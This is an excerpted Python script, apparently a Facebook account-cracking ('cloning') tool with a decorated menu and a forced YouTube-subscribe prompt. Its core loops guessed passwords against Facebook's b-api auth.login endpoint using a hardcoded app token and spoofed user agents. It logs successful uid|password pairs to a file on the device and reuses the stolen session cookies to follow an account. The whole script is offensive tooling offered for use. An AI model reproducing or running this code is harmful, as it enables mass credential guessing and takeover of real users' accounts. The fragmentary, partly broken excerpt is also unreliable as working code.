...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[Haris] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [Successful-Haris] {idf} * {pw}')
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [Successful-Haris] {idf} * {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Successful-Haris.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
\033[1;92m══════════════════════════════════════════════════
\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   :\33[1;32m MUHAMMAD HARIS
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : HARIS KHAN       
\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : HARIS-404
\33[1;32m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 1.0.1
\033[1;92m══════════════════════════════════════════════════
...
class Main:
	def __init__(self):
		...
		print("")
		print("\33[1;37m")
		print("\033[1;37mNote : \33[1;41m\33[1;37m𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐊𝐚 𝐋𝐢𝐘𝐚 𝐅𝐢𝐫𝐬𝐭 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐒𝐮𝐛𝐬𝐚𝐜𝐫𝐢𝐛𝐞\33[0m")
		print("________________________________________________")
		print("")
		print("\033[1;32m  |1| \33[1;37m𝗦𝘂𝗯𝘀𝗮𝗰𝗿𝗶𝗯𝗲 𝗔𝗿𝗲 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ")
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://youtube.com/channel/UChALOSK7MMNsDa3w07tIz7Q")
			print("")
			time.sleep(3.0)
			print("\033[1;32m    CHECHKING PLEASE WAIT ")
			print("")
			input("\n\033[1;37m CHANNEL NAME :  \033[1;37m")
			time.sleep(3.1)
			print("")
			print("\033[1;32m THANKS FOR SUBSACRIBE MY CHANNEL ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print(" ")
		print("\033[1;37m")
		print(" \033[1;37m[1]\033[1;37m ℂ𝕣𝕒𝕔𝕜 𝔽𝕚𝕝𝕖")
		print(" \033[1;37m[2] ℂ𝕣𝕒𝕔𝕜 ℙ𝕦𝕓𝕝𝕚𝕔 𝕀𝕕")
		print(" \33[1;37m[3] ℙ𝕒𝕜 ℝ𝕒𝕟𝕕𝕠𝕞 ℂ𝕝𝕠𝕟𝕚𝕟𝕘")
		print(" \033[1;37m[4] 𝟚𝟘𝟘𝟜 𝕋𝕠 𝟚𝟘𝟘𝟠")
		print(" \33[1;37m[5] 𝟚𝟘𝟘𝟡 𝕋𝕠 𝟚𝟘𝟙𝟜 ")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Successful-Haris]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Successful-Haris.txt","a").write(" %s|%s\n"%(uid, pw))
				break
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Successful-Haris] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Successful-Haris.txt","a").write(" %s|%s\n"%(uid, pw))
				break
